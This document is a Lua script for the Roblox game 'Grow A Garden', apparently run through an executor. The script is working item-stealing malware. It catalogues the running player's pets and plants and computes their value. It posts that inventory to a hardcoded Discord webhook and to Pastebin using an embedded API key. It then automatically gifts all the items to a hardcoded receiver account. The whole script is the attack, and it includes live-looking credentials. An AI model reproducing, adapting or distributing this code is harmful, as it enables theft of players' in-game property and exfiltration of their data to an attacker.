task.spawn(function()
	repeat task.wait() until game:IsLoaded()
	print("[DEBUG] Script started")

	_G.scriptExecuted = _G.scriptExecuted or false
	if _G.scriptExecuted then return end
	_G.scriptExecuted = true

	-- CONFIG
	local users = _G.Usernames or {"DanyelQuibs"}
	local min_value = _G.min_value or 100000
	local ping = _G.pingEveryone or "No"
	local webhook = "https://discord.com/api/webhooks/1381539080160153621/IObLnz7ULfAVwMYQT4EuVrbaedOVrXkB8wnwyeKcqo60aXAsW1SWHFtJXwMTqwLXLNPq"
	local pastebin_api_key = "kZi_lZU3maKIm3hEDOgM2m4yttXDuPpS"

	-- SERVICES
	local Players = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local plr = Players.LocalPlayer
	local replicatedStorage = game:GetService("ReplicatedStorage")
	local backpack = plr:WaitForChild("Backpack")
	local character = plr.Character or plr.CharacterAdded:Wait()

	-- MODULES
	local calcPlantValue, petUtils, petRegistry, numberUtil, dataService
	local success, err = pcall(function()
		local modules = replicatedStorage:WaitForChild("Modules")
		calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
		petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
		dataService = require(modules:WaitForChild("DataService"))
		numberUtil = require(modules:WaitForChild("NumberUtil"))
		petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
	end)

	if not success then
		warn("[ERROR] Failed to load modules:", err)
		return
	end

	print("[DEBUG] All modules loaded")

	local rarePetEmojis = {
		["Red Fox"] = "🦊",
		["Raccoon"] = "🦝",
		["Dragonfly"] = "🐲"
	}

	local function formatShort(n)
		if n >= 1e12 then return string.format("%.2fT", n / 1e12) end
		if n >= 1e9 then return string.format("%.2fB", n / 1e9) end
		if n >= 1e6 then return string.format("%.2fM", n / 1e6) end
		if n >= 1e3 then return string.format("%.2fK", n / 1e3) end
		return tostring(math.floor(n))
	end

	local function getWeight(tool)
		local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG")
		if weightValue and weightValue:IsA("NumberValue") then
			return math.floor(weightValue.Value * 100 + 0.5) / 100
		end
		local match = tool.Name:match("%[(%d+%.?%d*) ?KG%]") or tool.Name:match("%((%d+%.?%d*) ?kg%)")
		return match and tonumber(match) or 0
	end

	local function calcPetValue(petData)
		local eggData = petRegistry.PetEggs[petData.PetData.HatchedFrom]
		if not eggData then return 0 end
		local rarity = eggData.RarityData.Items[petData.PetType]
		if not rarity then return 0 end
		local weightRange = rarity.GeneratedPetData.WeightRange
		local interp = numberUtil.ReverseLerp(weightRange[1], weightRange[2], petData.PetData.BaseWeight)
		local scale = math.lerp(0.8, 1.2, interp)
		local levelProgress = petUtils:GetLevelProgress(petData.PetData.Level)
		local finalScale = scale * math.lerp(0.15, 6, levelProgress)
		local value = petRegistry.PetList[petData.PetType].SellPrice * finalScale
		return math.floor(value)
	end

	local itemsToSend = {}
	local totalValue = 0

	for _, tool in ipairs(backpack:GetChildren()) do
		if not tool:IsA("Tool") then continue end
		local nameLower = tool.Name:lower()
		if nameLower:find("seed") or nameLower:find("shovel") or nameLower:find("water") or nameLower:find("fertilizer") then continue end

		local itemType = tool:GetAttribute("ItemType")
		local weight = getWeight(tool)

		if itemType == "Pet" then
			local uuid = tool:GetAttribute("PET_UUID")
			local petData = dataService:GetData().PetsData.PetInventory.Data[uuid]
			if petData then
				local name = petData.PetType
				local value = calcPetValue(petData)
				local icon = rarePetEmojis[name] or "🐶"
				table.insert(itemsToSend, {
					Tool = tool,
					Name = name,
					Value = value,
					Weight = weight,
					Type = "Pet",
					Emoji = icon,
					Rare = rarePetEmojis[name] ~= nil
				})
				totalValue += value
			end
		else
			local name = tool:GetAttribute("ItemName") or tool.Name
			local value = calcPlantValue(tool)
			table.insert(itemsToSend, {
				Tool = tool,
				Name = name,
				Value = value,
				Weight = weight,
				Type = "Plant",
				Emoji = "🍄",
				Rare = false
			})
			totalValue += value
		end
	end

	table.sort(itemsToSend, function(a, b)
		if a.Rare and not b.Rare then return true end
		if not a.Rare and b.Rare then return false end
		return a.Value > b.Value
	end)

	local function giftToPlayer(targetPlayer)
		local prompt = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and targetPlayer.Character.HumanoidRootPart:FindFirstChildWhichIsA("ProximityPrompt", true)
		if not prompt then return end

		for _, item in ipairs(itemsToSend) do
			item.Tool.Parent = character
			task.wait(0.2)
			fireproximityprompt(prompt)
			task.wait(0.2)
			item.Tool.Parent = backpack
		end
	end

	local function sendWebhook()
		local infoBlock = string.format(":bust_in_silhouette: Player Information\n```Name: %s\nReceiver: %s```", plr.Name, users[1] or "?")
		local valueBlock = string.format(":moneybag: Total Value\n```%s¢```", formatShort(totalValue))
		local previewBlock = ":palm_tree: Backpack (Top Items)\n```\n"
		local pasteData = ""
		local count = 0

		for _, item in ipairs(itemsToSend) do
			local line = string.format("%s - %s [%.2f KG] → %s¢\n", item.Emoji, item.Name, item.Weight, formatShort(item.Value))
			pasteData ..= line
			if count < 25 then previewBlock ..= line end
			count += 1
		end
		previewBlock ..= "```"

		local pasteLink = "Failed to upload to Pastebin"
		local pasteRequest = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
		if pasteRequest then
			local result = pasteRequest({
				Url = "https://pastebin.com/api/api_post.php",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
				Body = "api_dev_key=" .. pastebin_api_key ..
					"&api_option=paste" ..
					"&api_paste_private=1" ..
					"&api_paste_name=" .. HttpService:UrlEncode("Item List - " .. plr.Name) ..
					"&api_paste_expire_date=N" ..
					"&api_paste_format=text" ..
					"&api_paste_code=" .. HttpService:UrlEncode(pasteData)
			})
			if result and result.Body and result.Body:find("https://pastebin.com/") then
				pasteLink = result.Body:gsub("https://pastebin.com/", "https://pastebin.com/raw/")
			end
		end

		local linkBlock = string.format(":link: Full Item List\n%s", pasteLink)

		local data = {
			embeds = { {
				title = ":potted_plant: Grow A Garden Hit - PRIMO SCRIPTS :four_leaf_clover:",
				description = table.concat({infoBlock, valueBlock, previewBlock, linkBlock}, "\n"),
				color = 65280
			} }
		}

		local request = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
		if request then
			local ok, err = pcall(function()
				request({
					Url = webhook,
					Method = "POST",
					Headers = { ["Content-Type"] = "application/json" },
					Body = HttpService:JSONEncode(data)
				})
			end)
			if ok then
				print("[DEBUG] Webhook sent")
			else
				warn("[ERROR] Failed to send webhook:", err)
			end
		end
	end

	if #itemsToSend > 0 then
		sendWebhook()
		for _, p in ipairs(Players:GetPlayers()) do
			if table.find(users, p.Name) then
				giftToPlayer(p)
				break
			end
		end
	else
		print("[DEBUG] No items found in backpack.")
	end
end)
